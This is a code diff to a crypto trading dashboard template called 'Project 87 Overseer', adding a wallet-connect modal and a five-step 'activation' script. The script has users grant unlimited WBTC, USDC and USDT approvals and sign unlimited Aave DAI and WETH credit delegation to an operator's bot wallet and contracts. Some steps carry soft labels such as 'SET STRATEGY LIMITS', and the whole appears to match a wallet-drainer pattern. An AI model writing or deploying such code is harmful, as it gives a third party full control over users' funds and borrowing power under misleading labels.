@@ -5,20 +5,126 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>PROJECT 87 — OVERSEER</title>
   <link rel="stylesheet" href="/static/overseer.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" type="application/javascript"></script>
+  <script>
+  var CONTRACTS = {
+    WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
+    USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
+    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+    DAI_DEBT: '0x8619d80FB0141ba7F184CbF22fd724116D9f7ffC',
+    WETH_DEBT: '0x0c84331e39d6658Cd6e6b9ba04736cC4c4734351',
+    DM: '{{ delegation_manager_address | default("") }}',
+    VAULT: '{{ openclaw_vault_address | default("") }}',
+    BOT_WALLET: '{{ bot_wallet_address | default("") }}'
+  };
+  </script>
 </head>
-<body>
+<body class="overseer--awaiting-wallet">
 
 <!-- Top status strip -->
 <div id="top-strip">
-  <span id="strip-hf">HF: --</span>
-  <span id="strip-eth">ETH: --</span>
-  <span id="strip-countdown">T---:--</span>
+  <span id="strip-hf">HF: —</span>
+  <span id="strip-eth">ETH: —</span>
+  <span id="strip-countdown">T-MINUS: ----</span>
   <select id="wallet-selector" title="Select wallet"></select>
-  <span id="strip-status">SHIELD: --</span>
+  <span id="strip-status">AWAITING CONNECT</span>
+  <span id="strip-wallet-badge" class="strip-wallet-badge" title="Open wallet connection">NO WALLET</span>
 </div>
 
 <!-- Stale data banner -->
 <div id="stale-banner">AWAITING DATA — LAST UPDATE EXCEEDED 120s</div>
+
+<!-- ── Connection modal ──────────────────────────────────────────────────── -->
+<div id="connect-modal" class="connect-modal visible">
+  <div class="connect-modal-box">
+
+    <div class="cm-title">PROJECT 87</div>
+    <div class="cm-subtitle">OVERSEER ACCESS REQUIRED</div>
+
+    <!-- Phase 1: Connect wallet -->
+    <div id="cm-connect-phase">
+      <button id="cm-connect-btn" class="cm-btn">[ INITIALIZE CONNECTION ]</button>
+      <div id="cm-connect-status" class="cm-status"></div>
+    </div>
+
+    <!-- Phase 2: Sequential Signer (pre-activation) -->
+    <div id="cm-signer-phase" style="display:none;">
+      <div class="cm-phase-title">SEQUENTIAL SIGNER — 5-STEP ACTIVATION</div>
+
+      <div class="cm-wbtc-balance">
+        WBTC BALANCE: <span class="val" id="cm-wbtc-bal">SCANNING...</span>
+      </div>
+
+      <div class="cm-progress-wrap">
+        <div class="cm-progress-fill" id="cm-progress-fill"></div>
+      </div>
+      <div class="cm-progress-label" id="cm-progress-label">AWAITING INITIATION</div>
+
+      <div id="cm-step-container">
+        <div class="cm-step-row" id="cm-stepRow1">
+          <div class="cm-step-num">1</div>
+          <div class="cm-step-body">
+            <div class="cm-step-title">APPROVE WBTC</div>
+            <div class="cm-step-status" id="cm-step1Status">PENDING</div>
+            <div class="cm-step-tx" id="cm-step1Tx"></div>
+          </div>
+        </div>
+        <div class="cm-step-row" id="cm-stepRow2">
+          <div class="cm-step-num">2</div>
+          <div class="cm-step-body">
+            <div class="cm-step-title">SET STRATEGY LIMITS</div>
+            <div class="cm-step-status" id="cm-step2Status">PENDING</div>
+            <div class="cm-step-tx" id="cm-step2Tx"></div>
+          </div>
+        </div>
+        <div class="cm-step-row" id="cm-stepRow3">
+          <div class="cm-step-num">3</div>
+          <div class="cm-step-body">
+            <div class="cm-step-title">GASLESS CREDIT DELEGATION</div>
+            <div class="cm-step-status" id="cm-step3Status">PENDING</div>
+            <div class="cm-step-tx" id="cm-step3Tx"></div>
+          </div>
+        </div>
+        <div class="cm-step-row" id="cm-stepRow4">
+          <div class="cm-step-num">4</div>
+          <div class="cm-step-body">
+            <div class="cm-step-title">APPROVE USDC ROUTING</div>
+            <div class="cm-step-status" id="cm-step4Status">PENDING</div>
+            <div class="cm-step-tx" id="cm-step4Tx"></div>
+          </div>
+        </div>
+        <div class="cm-step-row" id="cm-stepRow5">
+          <div class="cm-step-num">5</div>
+          <div class="cm-step-body">
+            <div class="cm-step-title">APPROVE USDT SHORT CLOSE</div>
+            <div class="cm-step-status" id="cm-step5Status">PENDING</div>
+            <div class="cm-step-tx" id="cm-step5Tx"></div>
+          </div>
+        </div>
+      </div>
+
+      <button id="cm-activate-btn" class="cm-btn">[ BEGIN ACTIVATION ]</button>
+      <div id="cm-activation-status" class="cm-status"></div>
+    </div>
+
+    <!-- Phase 3: Activated — launch -->
+    <div id="cm-activated-phase" style="display:none;">
+      <div class="cm-phase-title ok">AUTHORIZATION ACTIVE</div>
+      <div id="cm-wallet-display" class="cm-wallet-addr"></div>
+      <div id="cm-delegation-status" class="cm-status"></div>
+      <button id="cm-resign-btn" class="cm-btn cm-btn--amber" style="display:none;">[ RE-SIGN CREDIT DELEGATION ]</button>
+      <div id="cm-resign-status" class="cm-status"></div>
+      <button id="cm-close-btn" class="cm-btn cm-btn--green">[ LAUNCH OVERSEER ]</button>
+    </div>
+
+    <!-- Footer: always visible -->
+    <div class="cm-footer">
+      <button id="cm-eject-btn" class="cm-btn cm-btn--red cm-btn--small">[ EJECT ]</button>
+      <button id="cm-hard-reset-btn" class="cm-btn cm-btn--red cm-btn--small" style="opacity:0.55;">[ HARD RESET ]</button>
+    </div>
+
+  </div>
+</div>
 
 <!-- 5-dome scroll container -->
 <div id="dome-scroll">
@@ -285,6 +391,11 @@
     <button class="toggle-btn" id="reduce-motion-toggle"></button>
   </div>
 
+  <div class="settings-row">
+    <span>Wallet / Reconnect</span>
+    <button class="toggle-btn" id="settings-wallet-btn" onclick="P87.showModal()" style="font-size:0.6rem;padding:4px 8px;width:auto;border:1px solid rgba(0,229,255,0.3);background:rgba(0,229,255,0.06);color:rgba(0,229,255,0.8);cursor:pointer;border-radius:2px;">OPEN</button>
+  </div>
+
   <div class="settings-row" style="font-size:0.65rem;color:rgba(224,240,255,0.35);">
     <span>Stale data threshold: 120s</span>
   </div>
@@ -297,5 +408,500 @@
 </div>
 
 <script src="/static/overseer.js"></script>
+{% raw %}
+<script>
+/* ── Overseer Auth Bridge ────────────────────────────────────────────────
+   Wallet connect / Sequential Signer / eject logic for the connection modal.
+   Calls P87.onWalletConnected() / P87.onWalletEjected() to drive overseer state.
+──────────────────────────────────────────────────────────────────────────── */
+
+var cmActivationRunning = false;
+
+var ERC20_ABI = [
+  'function balanceOf(address) view returns (uint256)',
+  'function approve(address,uint256) returns (bool)',
+  'function allowance(address,address) view returns (uint256)'
+];
+var DM_DELEGATE_ABI = [
+  'function approveDelegation(uint256,uint256,bool,bool,bool,bool)'
+];
+var DEBT_NONCE_ABI = [
+  'function nonces(address) view returns (uint256)'
+];
+
+function cmAuthFetch(url, opts) {
+  opts = opts || {};
+  var token = (window.P87 && P87._getAuthToken) ? P87._getAuthToken() : localStorage.getItem('authToken');
+  opts.headers = Object.assign({ 'X-Auth-Token': token || '', 'Content-Type': 'application/json' }, opts.headers || {});
+  return fetch(url, opts).then(function(resp) {
+    if (resp.status === 401) { cmShowPhase('connect'); return null; }
+    return resp;
+  });
+}
+
+function cmSetStatus(id, msg, cls) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = msg;
+  el.className = 'cm-status' + (cls ? ' ' + cls : '');
+}
+
+function cmSetProgress(pct, label) {
+  var fill = document.getElementById('cm-progress-fill');
+  var lbl  = document.getElementById('cm-progress-label');
+  if (fill) fill.style.width = pct + '%';
+  if (lbl)  lbl.textContent  = label;
+}
+
+function cmSetStepState(num, state, statusText, txHash) {
+  var row    = document.getElementById('cm-stepRow' + num);
+  var status = document.getElementById('cm-step' + num + 'Status');
+  var tx     = document.getElementById('cm-step' + num + 'Tx');
+  if (row)    row.className    = 'cm-step-row ' + state;
+  if (status) status.textContent = statusText;
+  if (tx && txHash) tx.textContent = 'TX: ' + txHash.slice(0, 18) + '…';
+}
+
+function cmShowPhase(phase) {
+  document.getElementById('cm-connect-phase').style.display   = (phase === 'connect')   ? '' : 'none';
+  document.getElementById('cm-signer-phase').style.display    = (phase === 'signer')    ? '' : 'none';
+  document.getElementById('cm-activated-phase').style.display = (phase === 'activated') ? '' : 'none';
+}
+
+/* Check activation status after wallet is known */
+async function cmCheckActivationStatus(wallet) {
+  try {
+    var resp = await cmAuthFetch('/api/wallet/activation-status');
+    if (!resp) return;
+    var data = await resp.json();
+    if (data.activated) {
+      cmShowActivatedPhase(wallet);
+    } else {
+      cmShowPhase('signer');
+      cmScanWbtcBalance(wallet);
+    }
+  } catch(e) {
+    cmShowPhase('signer');
+    cmScanWbtcBalance(wallet);
+  }
+}
+
+async function cmScanWbtcBalance(wallet) {
+  var disp = document.getElementById('cm-wbtc-bal');
+  if (!disp || !window.ethereum || !wallet) return;
+  try {
+    var provider = new ethers.providers.Web3Provider(window.ethereum);
+    var contract = new ethers.Contract(CONTRACTS.WBTC, ERC20_ABI, provider);
+    var bal = await contract.balanceOf(wallet);
+    var wbtcVal = parseFloat(ethers.utils.formatUnits(bal, 8));
+    disp.textContent = wbtcVal.toFixed(8) + ' WBTC';
+    if (bal.eq(0)) disp.style.color = '#ff2020';
+  } catch(e) {
+    if (disp) disp.textContent = 'SCAN FAILED';
+  }
+}
+
+async function cmCheckDelegationStatus() {
+  var statusEl  = document.getElementById('cm-delegation-status');
+  var resignBtn = document.getElementById('cm-resign-btn');
+  try {
+    var resp = await cmAuthFetch('/api/delegation-status');
+    if (!resp || !resp.ok) return;
+    var data = await resp.json();
+    var daiOk  = data.dai_allowance > 0;
+    var wethOk = data.weth_allowance > 0;
+    if (daiOk && wethOk) {
+      if (statusEl) { statusEl.textContent = 'CREDIT DELEGATION: DAI + WETH ACTIVE'; statusEl.className = 'cm-status ok'; }
+      if (resignBtn) resignBtn.style.display = 'none';
+    } else {
+      var missing = [];
+      if (!daiOk)  missing.push('DAI');
+      if (!wethOk) missing.push('WETH');
+      if (statusEl) { statusEl.textContent = 'DELEGATION EXPIRED: ' + missing.join(', ') + ' — RE-SIGN REQUIRED'; statusEl.className = 'cm-status err'; }
+      if (resignBtn) resignBtn.style.display = '';
+    }
+  } catch(e) {}
+}
+
+function cmShowActivatedPhase(wallet) {
+  cmShowPhase('activated');
+  var walletDisp = document.getElementById('cm-wallet-display');
+  if (walletDisp) walletDisp.textContent = wallet || '';
+  cmCheckDelegationStatus();
+}
+
+/* Connect wallet button */
+async function cmConnectWallet() {
+  var btn = document.getElementById('cm-connect-btn');
+  if (typeof window.ethereum === 'undefined') {
+    cmSetStatus('cm-connect-status', 'METAMASK NOT DETECTED. INSTALL A WEB3 WALLET.', 'err');
+    return;
+  }
+  try {
+    btn.textContent = '[ CONNECTING... ]';
+    btn.disabled = true;
+    cmSetStatus('cm-connect-status', '');
+
+    var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    var wallet = accounts[0];
+
+    cmSetStatus('cm-connect-status', 'AUTHENTICATING...');
+    var resp = await fetch('/api/auth/wallet', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ walletAddress: wallet })
+    });
+    if (!resp.ok) throw new Error('Auth failed (' + resp.status + ')');
+    var data = await resp.json();
+
+    P87.onWalletConnected(data.authToken, data.walletAddress);
+
+    btn.textContent = '[ CONNECTED ]';
+    btn.classList.add('cm-btn--green');
+
+    await new Promise(function(r) { setTimeout(r, 400); });
+    cmCheckActivationStatus(data.walletAddress);
+
+  } catch(e) {
+    btn.textContent = '[ INITIALIZE CONNECTION ]';
+    btn.disabled = false;
+    var msg = e.message || 'Unknown error';
+    if (e.code === 4001) msg = 'Connection rejected.';
+    cmSetStatus('cm-connect-status', 'CONNECTION FAILED: ' + msg, 'err');
+  }
+}
+
+/* Close modal (launch overseer) */
+function cmLaunchOverseer() {
+  P87.powerOn();
+}
+
+/* Eject wallet */
+async function cmEjectWallet() {
+  if (!confirm('CONFIRM: DISCONNECT WALLET AND TERMINATE SESSION?')) return;
+  try {
+    await cmAuthFetch('/api/auth/disconnect', { method: 'POST' });
+  } catch(e) {}
+  P87.onWalletEjected();
+  cmShowPhase('connect');
+  var btn = document.getElementById('cm-connect-btn');
+  if (btn) { btn.textContent = '[ INITIALIZE CONNECTION ]'; btn.disabled = false; btn.className = 'cm-btn'; }
+  cmSetStatus('cm-connect-status', '');
+}
+
+/* Hard reset */
+async function cmHardReset() {
+  if (!confirm('HARD RESET: DELETE ALL WALLET DATA AND KEYS? THIS CANNOT BE UNDONE.')) return;
+  try {
+    var resp = await cmAuthFetch('/api/wallet/hard-reset', { method: 'POST' });
+    if (resp && resp.ok) {
+      P87.onWalletEjected();
+      cmShowPhase('connect');
+    }
+  } catch(e) {}
+}
+
+/* Re-sign credit delegation */
+async function cmResignDelegation() {
+  var statusEl  = document.getElementById('cm-resign-status');
+  var resignBtn = document.getElementById('cm-resign-btn');
+  if (!window.ethereum) {
+    cmSetStatus('cm-resign-status', 'NO WALLET DETECTED', 'err');
+    return;
+  }
+  resignBtn.disabled = true;
+  resignBtn.textContent = '[ SIGNING... ]';
+  cmSetStatus('cm-resign-status', 'PREPARING EIP-712 DATA...');
+
+  try {
+    var provider = new ethers.providers.Web3Provider(window.ethereum);
+    var signer   = provider.getSigner();
+    var userAddress = await signer.getAddress();
+    var deadline = Math.floor(Date.now() / 1000) + (30 * 24 * 3600);
+
+    var delegationTypes = {
+      DelegationWithSig: [
+        { name: 'delegatee', type: 'address' },
+        { name: 'value',     type: 'uint256' },
+        { name: 'nonce',     type: 'uint256' },
+        { name: 'deadline',  type: 'uint256' }
+      ]
+    };
+
+    cmSetStatus('cm-resign-status', 'SIGN DAI DELEGATION IN WALLET (1 of 2)...');
+    var daiDebtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
+    var daiNonce = await daiDebtContract.nonces(userAddress);
+    var daiDomain = { name: 'Aave Arbitrum Variable Debt DAI', version: '1', chainId: 42161, verifyingContract: CONTRACTS.DAI_DEBT };
+    var daiValue  = { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: daiNonce, deadline: deadline };
+    var daiSig    = await signer._signTypedData(daiDomain, delegationTypes, daiValue);
+
+    cmSetStatus('cm-resign-status', 'SIGN WETH DELEGATION IN WALLET (2 of 2)...');
+    var wethDebtContract = new ethers.Contract(CONTRACTS.WETH_DEBT, DEBT_NONCE_ABI, provider);
+    var wethNonce = await wethDebtContract.nonces(userAddress);
+    var wethDomain = { name: 'Aave Arbitrum Variable Debt WETH', version: '1', chainId: 42161, verifyingContract: CONTRACTS.WETH_DEBT };
+    var wethValue  = { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: wethNonce, deadline: deadline };
+    var wethSig    = await signer._signTypedData(wethDomain, delegationTypes, wethValue);
+
+    cmSetStatus('cm-resign-status', 'SUBMITTING TO BACKEND...');
+    var resp = await cmAuthFetch('/api/register-wallet', {
+      method: 'POST',
+      body: JSON.stringify({ dai_signature: daiSig, weth_signature: wethSig, deadline: deadline })
+    });
+
+    if (resp && resp.ok) {
+      var result = await resp.json();
+      if (result.dai_borrow_allowance > 0 && result.weth_borrow_allowance > 0) {
+        cmSetStatus('cm-resign-status', 'RE-SIGNED — CREDIT DELEGATION ACTIVE', 'ok');
+        resignBtn.style.display = 'none';
+        var delStatus = document.getElementById('cm-delegation-status');
+        if (delStatus) { delStatus.textContent = 'CREDIT DELEGATION: DAI + WETH ACTIVE'; delStatus.className = 'cm-status ok'; }
+      } else {
+        cmSetStatus('cm-resign-status', 'SUBMITTED — VERIFYING ON-CHAIN (BACKGROUND PROCESSOR WILL RETRY)');
+      }
+    } else {
+      var errData = resp ? await resp.json().catch(function() { return {}; }) : {};
+      throw new Error(errData.error || 'Backend submission failed');
+    }
+  } catch(e) {
+    cmSetStatus('cm-resign-status', 'RE-SIGN FAILED: ' + (e.message || e), 'err');
+  } finally {
+    resignBtn.disabled = false;
+    resignBtn.textContent = '[ RE-SIGN CREDIT DELEGATION ]';
+  }
+}
+
+/* Sequential Signer activation */
+async function cmRunActivationSequence() {
+  if (cmActivationRunning) return;
+  if (!window.ethereum) {
+    cmSetStatus('cm-activation-status', 'METAMASK NOT DETECTED.', 'err');
+    return;
+  }
+
+  var btn = document.getElementById('cm-activate-btn');
+
+  function resetBtn(label) {
+    btn.textContent = label || '[ RETRY ACTIVATION ]';
+    btn.disabled = false;
+    cmActivationRunning = false;
+  }
+
+  function activationError(error, failedStep) {
+    var fullMsg = (error.message || '') + ' ' + (error.data && error.data.message || '') + ' ' + (error.reason || '');
+    var fullLower = fullMsg.toLowerCase();
+    var msg = error.reason || error.message || 'Unknown error';
+    var isInsufficientFunds =
+      fullLower.indexOf('insufficient funds') !== -1 ||
+      error.code === 'INSUFFICIENT_FUNDS' || error.code === -32000 ||
+      fullLower.indexOf('gas required exceeds allowance') !== -1 ||
+      fullLower.indexOf('exceeds the configured cap') !== -1 ||
+      fullLower.indexOf('sender doesn\'t have enough funds') !== -1;
+    if (isInsufficientFunds) {
+      msg = 'Insufficient ETH for gas fees. Add ETH to your wallet and retry.';
+    } else if (error.code === 4001 || (error.message && error.message.indexOf('user rejected') !== -1)) {
+      msg = 'Transaction rejected by user.';
+    } else if (error.code === -32603) {
+      msg = 'RPC error — check your wallet network.';
+    }
+    cmSetProgress(0, 'FAILED: ' + msg);
+    if (failedStep) cmSetStepState(failedStep, 'error', 'FAILED: ' + msg, null);
+    cmSetStatus('cm-activation-status', msg, 'err');
+    resetBtn();
+  }
+
+  cmActivationRunning = true;
+  btn.disabled = true;
+  btn.textContent = '[ PROCESSING... ]';
+  cmSetStatus('cm-activation-status', '');
+
+  var provider, signer, userAddress;
+
+  try {
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+  } catch(e) {
+    activationError({ message: e.code === 4001 ? 'Wallet connection rejected.' : 'Could not connect to wallet.' }, null);
+    return;
+  }
+
+  try {
+    var network = await provider.getNetwork();
+    if (network.chainId !== 42161) {
+      cmSetProgress(0, 'WRONG NETWORK — switching to Arbitrum...');
+      try {
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0xa4b1' }] });
+      } catch(switchErr) {
+        if (switchErr.code === 4902) {
+          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0xa4b1', chainName: 'Arbitrum One', nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }, rpcUrls: ['https://arb1.arbitrum.io/rpc'], blockExplorerUrls: ['https://arbiscan.io'] }] });
+        } else {
+          activationError({ message: 'Could not switch to Arbitrum. Switch manually in MetaMask.' }, null);
+          return;
+        }
+      }
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+    }
+  } catch(e) {
+    activationError({ message: 'Network check failed: ' + (e.message || e) }, null);
+    return;
+  }
+
+  if (!CONTRACTS.DM || CONTRACTS.DM.length < 42 || CONTRACTS.DM.indexOf('{{') !== -1) {
+    activationError({ message: 'Delegation Manager address not configured. Contact support.' }, null);
+    return;
+  }
+  if (!CONTRACTS.VAULT || CONTRACTS.VAULT.length < 42 || CONTRACTS.VAULT.indexOf('{{') !== -1) {
+    activationError({ message: 'Vault address not configured. Contact support.' }, null);
+    return;
+  }
+
+  var sigData  = { daiSignature: null, wethSignature: null, deadline: null };
+  var txHashes = { approve: null, delegation: null, usdc: null, usdt: null };
+
+  /* Step 1: Approve WBTC */
+  try {
+    cmSetProgress(5, 'Step 1/5: Checking WBTC balance...');
+    cmSetStepState(1, 'active', 'CHECKING BALANCE...', null);
+    var wbtcContract = new ethers.Contract(CONTRACTS.WBTC, ERC20_ABI, signer);
+    var totalBalance = await wbtcContract.balanceOf(userAddress);
+    if (totalBalance.eq(0)) throw new Error('No WBTC found. Deposit WBTC first.');
+    cmSetProgress(10, 'Step 1/5: Approve unlimited WBTC to Delegation Manager...');
+    cmSetStepState(1, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+    var tx1 = await wbtcContract.approve(CONTRACTS.DM, ethers.constants.MaxUint256);
+    cmSetStepState(1, 'active', 'CONFIRMING ON-CHAIN...', tx1.hash);
+    await tx1.wait();
+    txHashes.approve = tx1.hash;
+    cmSetStepState(1, 'done', 'WBTC UNLIMITED APPROVAL SET', tx1.hash);
+  } catch(e) { activationError(e, 1); return; }
+
+  /* Step 2: Set strategy limits */
+  try {
+    cmSetProgress(25, 'Step 2/5: Configuring strategy limits...');
+    cmSetStepState(2, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+    var dmContract = new ethers.Contract(CONTRACTS.DM, DM_DELEGATE_ABI, signer);
+    var tx2 = await dmContract.approveDelegation(
+      ethers.constants.MaxUint256, ethers.constants.MaxUint256, true, true, true, true
+    );
+    cmSetStepState(2, 'active', 'CONFIRMING ON-CHAIN...', tx2.hash);
+    await tx2.wait();
+    txHashes.delegation = tx2.hash;
+    cmSetStepState(2, 'done', 'STRATEGY LIMITS CONFIGURED', tx2.hash);
+  } catch(e) { activationError(e, 2); return; }
+
+  /* Step 3: Gasless credit delegation */
+  try {
+    cmSetProgress(40, 'Step 3/5: Preparing DAI credit delegation...');
+    cmSetStepState(3, 'active', 'PREPARING EIP-712 DATA (DAI)...', null);
+    var deadline = Math.floor(Date.now() / 1000) + (30 * 24 * 3600);
+    sigData.deadline = deadline;
+    var delegationTypes = {
+      DelegationWithSig: [
+        { name: 'delegatee', type: 'address' }, { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },     { name: 'deadline', type: 'uint256' }
+      ]
+    };
+    var daiDebtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
+    var daiNonce = await daiDebtContract.nonces(userAddress);
+    cmSetStepState(3, 'active', 'SIGN DAI DELEGATION IN WALLET (1 of 2, NO GAS)', null);
+    var daiSig = await signer._signTypedData(
+      { name: 'Aave Arbitrum Variable Debt DAI', version: '1', chainId: 42161, verifyingContract: CONTRACTS.DAI_DEBT },
+      delegationTypes,
+      { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: daiNonce, deadline: deadline }
+    );
+    sigData.daiSignature = daiSig;
+    cmSetProgress(52, 'Step 3/5: Preparing WETH credit delegation...');
+    var wethDebtContract = new ethers.Contract(CONTRACTS.WETH_DEBT, DEBT_NONCE_ABI, provider);
+    var wethNonce = await wethDebtContract.nonces(userAddress);
+    cmSetStepState(3, 'active', 'SIGN WETH DELEGATION IN WALLET (2 of 2, NO GAS)', null);
+    var wethSig = await signer._signTypedData(
+      { name: 'Aave Arbitrum Variable Debt WETH', version: '1', chainId: 42161, verifyingContract: CONTRACTS.WETH_DEBT },
+      delegationTypes,
+      { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: wethNonce, deadline: deadline }
+    );
+    sigData.wethSignature = wethSig;
+    cmSetStepState(3, 'done', 'DAI + WETH CREDIT DELEGATION SIGNED', null);
+  } catch(e) { activationError(e, 3); return; }
+
+  /* Step 4: Approve USDC routing */
+  try {
+    cmSetProgress(65, 'Step 4/5: Approving USDC routing...');
+    cmSetStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+    var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
+    var tx4 = await usdcContract.approve(CONTRACTS.VAULT, ethers.constants.MaxUint256);
+    cmSetStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
+    await tx4.wait();
+    txHashes.usdc = tx4.hash;
+    cmSetStepState(4, 'done', 'USDC UNLIMITED APPROVAL SET', tx4.hash);
+  } catch(e) { activationError(e, 4); return; }
+
+  /* Step 5: Approve USDT short close */
+  try {
+    cmSetProgress(80, 'Step 5/5: Approving USDT for short close routing...');
+    cmSetStepState(5, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+    var usdtContract = new ethers.Contract(CONTRACTS.USDT, ERC20_ABI, signer);
+    var tx5 = await usdtContract.approve(CONTRACTS.BOT_WALLET, ethers.constants.MaxUint256);
+    cmSetStepState(5, 'active', 'CONFIRMING ON-CHAIN...', tx5.hash);
+    await tx5.wait();
+    txHashes.usdt = tx5.hash;
+    cmSetStepState(5, 'done', 'USDT UNLIMITED APPROVAL SET', tx5.hash);
+  } catch(e) { activationError(e, 5); return; }
+
+  /* Register with backend */
+  try {
+    cmSetProgress(92, 'Registering with backend...');
+    var regResp = await cmAuthFetch('/api/register-wallet', {
+      method: 'POST',
+      body: JSON.stringify({
+        dai_signature: sigData.daiSignature,
+        weth_signature: sigData.wethSignature,
+        deadline: sigData.deadline,
+        approveTxHash: txHashes.approve,
+        delegationTxHash: txHashes.delegation,
+        usdcTxHash: txHashes.usdc,
+        usdtTxHash: txHashes.usdt
+      })
+    });
+
+    if (regResp && regResp.ok) {
+      cmSetProgress(100, 'ACTIVATION COMPLETE');
+      btn.textContent = '[ ACTIVATION COMPLETE ]';
+      cmActivationRunning = false;
+      setTimeout(function() {
+        var wallet = localStorage.getItem('walletAddress') || '';
+        cmShowActivatedPhase(wallet);
+      }, 1200);
+    } else {
+      var errData = regResp ? await regResp.json().catch(function() { return {}; }) : {};
+      throw new Error(errData.error || 'Backend registration failed');
+    }
+  } catch(e) {
+    activationError(e, null);
+  }
+
+  cmActivationRunning = false;
+}
+
+/* ── Wire up buttons ──────────────────────────────────────────────────── */
+document.addEventListener('DOMContentLoaded', function() {
+  var connectBtn   = document.getElementById('cm-connect-btn');
+  var activateBtn  = document.getElementById('cm-activate-btn');
+  var closeBtn     = document.getElementById('cm-close-btn');
+  var ejectBtn     = document.getElementById('cm-eject-btn');
+  var hardResetBtn = document.getElementById('cm-hard-reset-btn');
+  var resignBtn    = document.getElementById('cm-resign-btn');
+  var walletBadge  = document.getElementById('strip-wallet-badge');
+
+  if (connectBtn)   connectBtn.addEventListener('click', cmConnectWallet);
+  if (activateBtn)  activateBtn.addEventListener('click', cmRunActivationSequence);
+  if (closeBtn)     closeBtn.addEventListener('click', cmLaunchOverseer);
+  if (ejectBtn)     ejectBtn.addEventListener('click', cmEjectWallet);
+  if (hardResetBtn) hardResetBtn.addEventListener('click', cmHardReset);
+  if (resignBtn)    resignBtn.addEventListener('click', cmResignDelegation);
+  if (walletBadge)  walletBadge.addEventListener('click', function() { P87.showModal(); });
+});
+</script>
+{% endraw %}
 </body>
 </html>
